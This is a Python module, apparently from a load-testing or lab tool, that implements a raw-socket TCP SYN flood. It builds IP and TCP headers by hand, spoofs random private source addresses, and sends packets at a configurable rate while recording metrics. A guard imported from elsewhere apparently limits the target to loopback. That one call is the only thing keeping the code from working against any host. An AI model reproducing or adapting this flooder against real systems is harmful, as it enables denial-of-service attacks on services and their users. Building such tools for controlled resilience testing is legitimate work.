from __future__ import annotations

import random
import socket
import struct
import time
from dataclasses import dataclass

from .guards import ensure_loopback_host
from .metrics import RunMetrics


def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for index in range(0, len(data), 2):
        total += (data[index] << 8) + data[index + 1]
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return (~total) & 0xFFFF


def _random_private_ip() -> str:
    block = random.choice([10, 172, 192])
    if block == 10:
        return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
    if block == 172:
        return f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
    return f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}"


def _ip_header(src_ip: str, dst_ip: str, payload_len: int) -> bytes:
    version_ihl = (4 << 4) | 5
    total_length = 20 + payload_len
    identification = random.randint(0, 0xFFFF)
    header = struct.pack(
        "!BBHHHBBHII",
        version_ihl,
        0,
        total_length,
        identification,
        0,
        64,
        socket.IPPROTO_TCP,
        0,
        struct.unpack("!I", socket.inet_aton(src_ip))[0],
        struct.unpack("!I", socket.inet_aton(dst_ip))[0],
    )
    checksum = _checksum(header)
    return struct.pack(
        "!BBHHHBBHII",
        version_ihl,
        0,
        total_length,
        identification,
        0,
        64,
        socket.IPPROTO_TCP,
        checksum,
        struct.unpack("!I", socket.inet_aton(src_ip))[0],
        struct.unpack("!I", socket.inet_aton(dst_ip))[0],
    )


def _tcp_syn_header(src_ip: str, dst_ip: str, src_port: int, dst_port: int) -> bytes:
    seq = random.randrange(0, 0xFFFFFFFF)
    tcp_header = struct.pack(
        "!HHIIHHHH",
        src_port,
        dst_port,
        seq,
        0,
        (5 << 12) | 0x02,
        64240,
        0,
        0,
    )
    pseudo_header = struct.pack(
        "!IIBBH",
        struct.unpack("!I", socket.inet_aton(src_ip))[0],
        struct.unpack("!I", socket.inet_aton(dst_ip))[0],
        0,
        socket.IPPROTO_TCP,
        len(tcp_header),
    )
    checksum = _checksum(pseudo_header + tcp_header)
    return struct.pack(
        "!HHIIHHHH",
        src_port,
        dst_port,
        seq,
        0,
        (5 << 12) | 0x02,
        64240,
        checksum,
        0,
    )


@dataclass(frozen=True)
class RawSynConfig:
    target: str
    port: int = 8080
    duration_s: float = 5.0
    rate: float = 500.0
    min_src_port: int = 1024
    max_src_port: int = 65535


def run_raw_syn_flood(cfg: RawSynConfig) -> RunMetrics:
    ensure_loopback_host(cfg.target)
    if cfg.duration_s <= 0:
        raise ValueError("duration_s must be > 0")
    if cfg.rate <= 0:
        raise ValueError("rate must be > 0")

    target_ip = socket.gethostbyname(cfg.target)
    metrics = RunMetrics()
    interval_s = 1.0 / cfg.rate
    end_at = time.perf_counter() + cfg.duration_s
    next_send = time.perf_counter()

    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    try:
        while time.perf_counter() < end_at:
            now = time.perf_counter()
            if now < next_send:
                time.sleep(next_send - now)
            src_ip = _random_private_ip()
            src_port = random.randint(cfg.min_src_port, cfg.max_src_port)
            tcp_header = _tcp_syn_header(src_ip, target_ip, src_port, cfg.port)
            ip_header = _ip_header(src_ip, target_ip, len(tcp_header))
            sent_at = time.perf_counter()
            try:
                sock.sendto(ip_header + tcp_header, (target_ip, cfg.port))
                metrics.record_ok((time.perf_counter() - sent_at) * 1000.0)
            except OSError:
                metrics.record_error()
            next_send = max(next_send, time.perf_counter()) + interval_s
    finally:
        sock.close()

    return metrics
